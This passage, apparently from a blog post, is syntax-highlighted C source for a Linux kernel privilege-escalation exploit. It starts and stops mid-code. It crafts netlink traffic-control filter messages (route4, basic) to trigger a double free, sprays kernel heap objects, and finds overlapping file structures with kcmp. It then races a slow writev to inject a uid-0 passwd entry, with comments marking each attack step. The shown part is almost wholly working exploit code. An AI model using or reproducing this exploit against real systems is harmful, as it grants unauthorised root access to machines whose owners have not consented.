msg-&gt;nlmsg_flags = NLM_F_REQUEST | flags;</span><br><span class="line">    msg-&gt;nlmsg_type = RTM_NEWTFILTER;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tcmsg</span> *<span class="title">t</span> =</span> (struct tcmsg *)(start + <span class="keyword">sizeof</span>(struct nlmsghdr));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// prio, protocol</span></span><br><span class="line">    <span class="keyword">u_int32_t</span> prio = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">u_int32_t</span> protocol = <span class="number">1</span>;</span><br><span class="line">    t-&gt;tcm_info = TC_H_MAKE(prio &lt;&lt; <span class="number">16</span>, protocol);</span><br><span class="line">    t-&gt;tcm_ifindex = <span class="number">1</span>;</span><br><span class="line">    t-&gt;tcm_family = AF_UNSPEC;</span><br><span class="line">    t-&gt;tcm_handle = handle;</span><br><span class="line"></span><br><span class="line">    addattr_l(msg, <span class="number">0x1000</span>, TCA_KIND, <span class="string">&quot;route&quot;</span>, <span class="number">6</span>);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rtattr</span> *<span class="title">tail</span> =</span> addattr_nest(msg, <span class="number">0x1000</span>, TCA_OPTIONS);</span><br><span class="line">    addattr_l(msg, <span class="number">0x1000</span>, TCA_ROUTE4_FROM, &amp;from, <span class="number">4</span>);</span><br><span class="line">    addattr_l(msg, <span class="number">0x1000</span>, TCA_ROUTE4_TO, &amp;to, <span class="number">4</span>);</span><br><span class="line">    addattr_nest_end(msg, tail);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// packing</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">iovec</span> <span class="title">iov</span> =</span> &#123;.iov_base = msg, .iov_len = msg-&gt;nlmsg_len&#125;;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_nl</span> <span class="title">nladdr</span> =</span> &#123;.nl_family = AF_NETLINK&#125;;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">msghdr</span> <span class="title">msgh</span> =</span> &#123;</span><br><span class="line">        .msg_name = &amp;nladdr,</span><br><span class="line">        .msg_namelen = <span class="keyword">sizeof</span>(nladdr),</span><br><span class="line">        .msg_iov = &amp;iov,</span><br><span class="line">        .msg_iovlen = <span class="number">1</span>,</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    sendmsg(fd, &amp;msgh, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(start);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add_tc</span><span class="params">(<span class="keyword">int</span> sockfd, <span class="keyword">uint32_t</span> handle, <span class="keyword">uint16_t</span> flag)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    add_tc_(sockfd, <span class="number">0</span>, handle, (handle &lt;&lt; <span class="number">8</span>) + handle, flag);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">uint32_t</span> <span class="title">calc_handle</span><span class="params">(<span class="keyword">uint32_t</span> from, <span class="keyword">uint32_t</span> to)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">uint32_t</span> handle = to;</span><br><span class="line"></span><br><span class="line">    assert(from &lt;= <span class="number">0xff</span> &amp;&amp; to &lt;= <span class="number">0xff</span>);</span><br><span class="line">    handle |= from &lt;&lt; <span class="number">16</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (((handle &amp; <span class="number">0x7f00</span>) | handle) != handle)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (handle == <span class="number">0</span> || (handle &amp; <span class="number">0x8000</span>))</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> handle;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">delete_tc_</span><span class="params">(<span class="keyword">int</span> sockfd, <span class="keyword">u_int32_t</span> handle)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *start = <span class="built_in">malloc</span>(<span class="number">0x4000</span>);</span><br><span class="line">    <span class="built_in">memset</span>(start, <span class="number">0</span>, <span class="number">0x4000</span>);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">nlmsghdr</span> *<span class="title">msg</span> =</span> (struct nlmsghdr *)start;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// new filter</span></span><br><span class="line">    msg = msg + msg-&gt;nlmsg_len;</span><br><span class="line">    msg-&gt;nlmsg_len = NLMSG_LENGTH(<span class="keyword">sizeof</span>(struct tcmsg));</span><br><span class="line">    msg-&gt;nlmsg_flags = NLM_F_REQUEST | NLM_F_ECHO;</span><br><span class="line">    msg-&gt;nlmsg_type = RTM_DELTFILTER;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tcmsg</span> *<span class="title">t</span> =</span> (struct tcmsg *)(start + <span class="keyword">sizeof</span>(struct nlmsghdr));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// prio, protocol</span></span><br><span class="line">    <span class="keyword">u_int32_t</span> prio = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">u_int32_t</span> protocol = <span class="number">1</span>;</span><br><span class="line">    t-&gt;tcm_info = TC_H_MAKE(prio &lt;&lt; <span class="number">16</span>, protocol);</span><br><span class="line">    t-&gt;tcm_ifindex = <span class="number">1</span>;</span><br><span class="line">    t-&gt;tcm_family = AF_UNSPEC;</span><br><span class="line">    t-&gt;tcm_handle = handle;</span><br><span class="line"></span><br><span class="line">    addattr_l(msg, <span class="number">0x1000</span>, TCA_KIND, <span class="string">&quot;route&quot;</span>, <span class="number">6</span>);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rtattr</span> *<span class="title">tail</span> =</span> addattr_nest(msg, <span class="number">0x1000</span>, TCA_OPTIONS);</span><br><span class="line">    addattr_nest_end(msg, tail);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// packing</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">iovec</span> <span class="title">iov</span> =</span> &#123;.iov_base = msg, .iov_len = msg-&gt;nlmsg_len&#125;;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_nl</span> <span class="title">nladdr</span> =</span> &#123;.nl_family = AF_NETLINK&#125;;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">msghdr</span> <span class="title">msgh</span> =</span> &#123;</span><br><span class="line">        .msg_name = &amp;nladdr,</span><br><span class="line">        .msg_namelen = <span class="keyword">sizeof</span>(nladdr),</span><br><span class="line">        .msg_iov = &amp;iov,</span><br><span class="line">        .msg_iovlen = <span class="number">1</span>,</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    sendmsg(sockfd, &amp;msgh, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">memset</span>(start, <span class="number">0</span>, <span class="number">0x4000</span>);</span><br><span class="line">    iov.iov_len = <span class="number">0x4000</span>;</span><br><span class="line">    iov.iov_base = start;</span><br><span class="line">    recvmsg(sockfd, &amp;msgh, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (msgh.msg_namelen != <span class="keyword">sizeof</span>(nladdr))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;size of sender address is wrong\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> start;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">delete_tc</span><span class="params">(<span class="keyword">int</span> sockfd, <span class="keyword">uint32_t</span> handle)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    delete_tc_(sockfd, ((handle) &lt;&lt; <span class="number">8</span>) + (handle));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// basic for spray</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">add_tc_basic</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">uint32_t</span> handle, <span class="keyword">void</span> *spray_data, <span class="keyword">size_t</span> spray_len,</span></span></span><br><span class="line"><span class="params"><span class="function">                 <span class="keyword">int</span> spray_count)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    assert(spray_len * spray_count &lt; <span class="number">0x3000</span>);</span><br><span class="line">    <span class="keyword">char</span> *start = <span class="built_in">malloc</span>(<span class="number">0x4000</span>);</span><br><span class="line">    <span class="built_in">memset</span>(start, <span class="number">0</span>, <span class="number">0x4000</span>);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">nlmsghdr</span> *<span class="title">msg</span> =</span> (struct nlmsghdr *)start;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// new filter</span></span><br><span class="line">    msg = msg + msg-&gt;nlmsg_len;</span><br><span class="line">    msg-&gt;nlmsg_len = NLMSG_LENGTH(<span class="keyword">sizeof</span>(struct tcmsg));</span><br><span class="line">    msg-&gt;nlmsg_flags = NLM_F_REQUEST | NLM_F_CREATE; <span class="comment">// | flags;</span></span><br><span class="line">    msg-&gt;nlmsg_type = RTM_NEWTFILTER;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tcmsg</span> *<span class="title">t</span> =</span> (struct tcmsg *)(start + <span class="keyword">sizeof</span>(struct nlmsghdr));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// prio, protocol</span></span><br><span class="line">    <span class="keyword">u_int32_t</span> prio = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">u_int32_t</span> protocol = <span class="number">1</span>;</span><br><span class="line">    t-&gt;tcm_info = TC_H_MAKE(prio &lt;&lt; <span class="number">16</span>, protocol);</span><br><span class="line">    t-&gt;tcm_ifindex = <span class="number">1</span>;</span><br><span class="line">    t-&gt;tcm_family = AF_UNSPEC;</span><br><span class="line">    t-&gt;tcm_handle = handle;</span><br><span class="line">    <span class="comment">// t-&gt;tcm_parent = TC_H_ROOT;</span></span><br><span class="line"></span><br><span class="line">    addattr_l(msg, <span class="number">0x4000</span>, TCA_KIND, <span class="string">&quot;basic&quot;</span>, <span class="number">6</span>);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rtattr</span> *<span class="title">tail</span> =</span> addattr_nest(msg, <span class="number">0x4000</span>, TCA_OPTIONS);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rtattr</span> *<span class="title">ema_tail</span> =</span> addattr_nest(msg, <span class="number">0x4000</span>, TCA_BASIC_EMATCHES);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tcf_ematch_tree_hdr</span> <span class="title">tree_hdr</span> =</span> &#123;.nmatches = spray_count / <span class="number">2</span>,</span><br><span class="line">                                           .progid = <span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">    addattr_l(msg, <span class="number">0x4000</span>, TCA_EMATCH_TREE_HDR, &amp;tree_hdr, <span class="keyword">sizeof</span>(tree_hdr));</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rtattr</span> *<span class="title">rt_match_tail</span> =</span></span><br><span class="line">        addattr_nest(msg, <span class="number">0x4000</span>, TCA_EMATCH_TREE_LIST);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> *data = <span class="built_in">malloc</span>(<span class="number">0x3000</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; tree_hdr.nmatches; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">char</span> *current;</span><br><span class="line">        <span class="built_in">memset</span>(data, <span class="number">0</span>, <span class="number">0x3000</span>);</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">tcf_ematch_hdr</span> *<span class="title">hdr</span> =</span> (struct tcf_ematch_hdr *)data;</span><br><span class="line">        hdr-&gt;kind = TCF_EM_META;</span><br><span class="line">        hdr-&gt;flags = TCF_EM_REL_AND;</span><br><span class="line"></span><br><span class="line">        current = data + <span class="keyword">sizeof</span>(*hdr);</span><br><span class="line"></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">tcf_meta_hdr</span> <span class="title">meta_hdr</span> =</span> &#123;</span><br><span class="line">            .left.kind = TCF_META_TYPE_VAR &lt;&lt; <span class="number">12</span> | TCF_META_ID_DEV,</span><br><span class="line">            .right.kind = TCF_META_TYPE_VAR &lt;&lt; <span class="number">12</span> | TCF_META_ID_DEV,</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        current += addattr(current, TCA_EM_META_HDR, &amp;meta_hdr, <span class="keyword">sizeof</span>(hdr));</span><br><span class="line">        current += addattr(current, TCA_EM_META_LVALUE, spray_data, spray_len);</span><br><span class="line">        current += addattr(current, TCA_EM_META_RVALUE, spray_data, spray_len);</span><br><span class="line"></span><br><span class="line">        addattr_l(msg, <span class="number">0x4000</span>, i + <span class="number">1</span>, data, current - data);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    addattr_nest_end(msg, rt_match_tail);</span><br><span class="line">    addattr_nest_end(msg, ema_tail);</span><br><span class="line">    addattr_nest_end(msg, tail);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// packing</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">iovec</span> <span class="title">iov</span> =</span> &#123;.iov_base = msg, .iov_len = msg-&gt;nlmsg_len&#125;;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_nl</span> <span class="title">nladdr</span> =</span> &#123;.nl_family = AF_NETLINK&#125;;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">msghdr</span> <span class="title">msgh</span> =</span> &#123;</span><br><span class="line">        .msg_name = &amp;nladdr,</span><br><span class="line">        .msg_namelen = <span class="keyword">sizeof</span>(nladdr),</span><br><span class="line">        .msg_iov = &amp;iov,</span><br><span class="line">        .msg_iovlen = <span class="number">1</span>,</span><br><span class="line">    &#125;;</span><br><span class="line">    sendmsg(fd, &amp;msgh, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">free</span>(data);</span><br><span class="line">    <span class="built_in">free</span>(start);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">delete_tc_basic</span><span class="params">(<span class="keyword">int</span> sockfd, <span class="keyword">u_int32_t</span> handle)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *start = <span class="built_in">malloc</span>(<span class="number">0x4000</span>);</span><br><span class="line">    <span class="built_in">memset</span>(start, <span class="number">0</span>, <span class="number">0x4000</span>);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">nlmsghdr</span> *<span class="title">msg</span> =</span> (struct nlmsghdr *)start;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// new filter</span></span><br><span class="line">    msg = msg + msg-&gt;nlmsg_len;</span><br><span class="line">    msg-&gt;nlmsg_len = NLMSG_LENGTH(<span class="keyword">sizeof</span>(struct tcmsg));</span><br><span class="line">    msg-&gt;nlmsg_flags = NLM_F_REQUEST | NLM_F_ECHO;</span><br><span class="line">    msg-&gt;nlmsg_type = RTM_DELTFILTER;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tcmsg</span> *<span class="title">t</span> =</span> (struct tcmsg *)(start + <span class="keyword">sizeof</span>(struct nlmsghdr));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// prio, protocol</span></span><br><span class="line">    <span class="keyword">u_int32_t</span> prio = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">u_int32_t</span> protocol = <span class="number">1</span>;</span><br><span class="line">    t-&gt;tcm_info = TC_H_MAKE(prio &lt;&lt; <span class="number">16</span>, protocol);</span><br><span class="line">    t-&gt;tcm_ifindex = <span class="number">1</span>;</span><br><span class="line">    t-&gt;tcm_family = AF_UNSPEC;</span><br><span class="line">    t-&gt;tcm_handle = handle;</span><br><span class="line">    <span class="comment">// t-&gt;tcm_parent = TC_H_ROOT;</span></span><br><span class="line"></span><br><span class="line">    addattr_l(msg, <span class="number">0x1000</span>, TCA_KIND, <span class="string">&quot;basic&quot;</span>, <span class="number">6</span>);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rtattr</span> *<span class="title">tail</span> =</span> addattr_nest(msg, <span class="number">0x1000</span>, TCA_OPTIONS);</span><br><span class="line">    addattr_nest_end(msg, tail);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// packing</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">iovec</span> <span class="title">iov</span> =</span> &#123;.iov_base = msg, .iov_len = msg-&gt;nlmsg_len&#125;;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_nl</span> <span class="title">nladdr</span> =</span> &#123;.nl_family = AF_NETLINK&#125;;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">msghdr</span> <span class="title">msgh</span> =</span> &#123;</span><br><span class="line">        .msg_name = &amp;nladdr,</span><br><span class="line">        .msg_namelen = <span class="keyword">sizeof</span>(nladdr),</span><br><span class="line">        .msg_iov = &amp;iov,</span><br><span class="line">        .msg_iovlen = <span class="number">1</span>,</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    sendmsg(sockfd, &amp;msgh, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">memset</span>(start, <span class="number">0</span>, <span class="number">0x4000</span>);</span><br><span class="line">    iov.iov_len = <span class="number">0x4000</span>;</span><br><span class="line">    iov.iov_base = start;</span><br><span class="line">    recvmsg(sockfd, &amp;msgh, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (msgh.msg_namelen != <span class="keyword">sizeof</span>(nladdr))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;size of sender address is wrong\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> start;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">slow_write</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;start slow write\n&quot;</span>);</span><br><span class="line">    <span class="keyword">clock_t</span> start, end;</span><br><span class="line">    <span class="keyword">int</span> fd = open(<span class="string">&quot;./uaf&quot;</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        perror(<span class="string">&quot;error open uaf file&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">int</span> addr = <span class="number">0x30000000</span>;</span><br><span class="line">    <span class="keyword">int</span> offset;</span><br><span class="line">    <span class="keyword">for</span> (offset = <span class="number">0</span>; offset &lt; <span class="number">0x80000</span> / <span class="number">20</span>; offset++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">void</span> *r = mmap((<span class="keyword">void</span> *)(addr + offset * <span class="number">0x1000</span>), <span class="number">0x1000</span>,</span><br><span class="line">                       PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> (r &lt; <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;allocate failed at 0x%x\n&quot;</span>, offset);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    assert(offset &gt; <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">void</span> *mem = (<span class="keyword">void</span> *)(addr);</span><br><span class="line">    <span class="built_in">memcpy</span>(mem, <span class="string">&quot;hhhhh&quot;</span>, <span class="number">5</span>);</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">iovec</span> <span class="title">iov</span>[20];</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">20</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        iov[i].iov_base = mem;</span><br><span class="line">        iov[i].iov_len = offset * <span class="number">0x1000</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    run_write = <span class="number">1</span>;</span><br><span class="line">    start = clock();</span><br><span class="line">    <span class="comment">// 2GB max</span></span><br><span class="line">    <span class="keyword">if</span> (writev(fd, iov, <span class="number">20</span>) &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        perror(<span class="string">&quot;slow write&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    end = clock();</span><br><span class="line">    <span class="keyword">double</span> spent = (<span class="keyword">double</span>)(end - start) / CLOCKS_PER_SEC;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;write done, spent %f s\n&quot;</span>, spent);</span><br><span class="line">    run_write = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">write_cmd</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// user:$1$user$k8sntSoh7jhsc6lwspjsU.:0:0:/root/root:/bin/bash</span></span><br><span class="line">    <span class="keyword">char</span> data[<span class="number">1024</span>] =</span><br><span class="line">        <span class="string">&quot;user:$1$user$k8sntSoh7jhsc6lwspjsU.:0:0:/root/root:/bin/bash&quot;</span>;</span><br><span class="line">    <span class="comment">// struct iovec iov = &#123;.iov_base = data, .iov_len = strlen(data)&#125;;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">iovec</span> <span class="title">iov</span> =</span> &#123;.iov_base = content, .iov_len = <span class="built_in">strlen</span>(content)&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (!run_write)</span><br><span class="line">    &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    run_spray = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> (writev(overlap_a, &amp;iov, <span class="number">1</span>) &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;failed to write\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;should be after the slow write\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">pre_exploit</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    adjust_rlimit();</span><br><span class="line">    use_temporary_dir();</span><br><span class="line">    setup_namespace();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">exploit</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">2</span> * PAGE_SIZE] = &#123;&#125;;</span><br><span class="line">    <span class="keyword">char</span> msg[<span class="number">0x10</span>] = &#123;&#125;;</span><br><span class="line">    <span class="keyword">char</span> *spray;</span><br><span class="line">    <span class="keyword">int</span> cc;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rlimit</span> <span class="title">old_lim</span>, <span class="title">lim</span>, <span class="title">new_lim</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get old limits</span></span><br><span class="line">    <span class="keyword">if</span> (getrlimit(RLIMIT_NOFILE, &amp;old_lim) == <span class="number">0</span>)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Old limits -&gt; soft limit= %ld \t&quot;</span></span><br><span class="line">               <span class="string">&quot; hard limit= %ld \n&quot;</span>,</span><br><span class="line">               old_lim.rlim_cur, old_lim.rlim_max);</span><br><span class="line">    pin_on_cpu(<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;starting exploit, num of cores: %d\n&quot;</span>, cpu_cores);</span><br><span class="line"></span><br><span class="line">    sockfd = socket(PF_NETLINK, SOCK_RAW, <span class="number">0</span>);</span><br><span class="line">    assert(sockfd != <span class="number">-1</span>);</span><br><span class="line">    add_qdisc(sockfd);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// wait for parent</span></span><br><span class="line">    <span class="keyword">if</span> (read(pipe_child[<span class="number">0</span>], msg, <span class="number">2</span>) != <span class="number">2</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        err(<span class="number">1</span>, <span class="string">&quot;read from parent&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// allocate the vulnerable object</span></span><br><span class="line">    add_tc_(sockfd, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, NLM_F_EXCL | NLM_F_CREATE);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ask parent to keep spraying</span></span><br><span class="line">    <span class="keyword">if</span> (write(pipe_parent[<span class="number">1</span>], <span class="string">&quot;OK&quot;</span>, <span class="number">2</span>) != <span class="number">2</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        err(<span class="number">1</span>, <span class="string">&quot;write to child&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (read(pipe_child[<span class="number">0</span>], msg, <span class="number">2</span>) != <span class="number">2</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        err(<span class="number">1</span>, <span class="string">&quot;read from parent&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// free the object, to free the slab</span></span><br><span class="line">    add_tc_(sockfd, <span class="number">0x11</span>, <span class="number">0x12</span>, <span class="number">0</span>, NLM_F_CREATE);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// wait for the vulnerable object being freed</span></span><br><span class="line">    usleep(<span class="number">500</span> * <span class="number">1000</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;freed the filter object\n&quot;</span>);</span><br><span class="line">    <span class="comment">// sync</span></span><br><span class="line">    <span class="keyword">if</span> (write(pipe_parent[<span class="number">1</span>], <span class="string">&quot;OK&quot;</span>, <span class="number">2</span>) != <span class="number">2</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        err(<span class="number">1</span>, <span class="string">&quot;write to child&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (read(pipe_child[<span class="number">0</span>], msg, <span class="number">2</span>) != <span class="number">2</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        err(<span class="number">1</span>, <span class="string">&quot;read from parent&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    usleep(<span class="number">1000</span> * <span class="number">1000</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; spray_num_1; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        pin_on_cpu(i % cpu_cores);</span><br><span class="line">        fds[i] = open(<span class="string">&quot;./data2&quot;</span>, <span class="number">1</span>);</span><br><span class="line">        assert(fds[i] &gt; <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// double free route4, which will free the file</span></span><br><span class="line">    add_tc_(sockfd, <span class="number">0x11</span>, <span class="number">0x13</span>, <span class="number">0</span>, NLM_F_CREATE);</span><br><span class="line">    usleep(<span class="number">1000</span> * <span class="number">100</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// should not sleep too long, otherwise file might be claimed by others</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;double free done\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;spraying files\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// the following is to figure out which file is freed</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; spray_num_2; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        pin_on_cpu(i % cpu_cores);</span><br><span class="line">        fd_2[i] = open(<span class="string">&quot;./uaf&quot;</span>, <span class="number">1</span>);</span><br><span class="line">        assert(fd_2[i] &gt; <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; spray_num_1; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (syscall(__NR_kcmp, getpid(), getpid(), KCMP_FILE, fds[j], fd_2[i]) ==</span><br><span class="line">                <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;found overlap, id : %d, %d\n&quot;</span>, i, j);</span><br><span class="line">                overlap_a = fds[j];</span><br><span class="line">                overlap_b = fd_2[i];</span><br><span class="line"></span><br><span class="line">                <span class="keyword">pthread_t</span> pid, pid2;</span><br><span 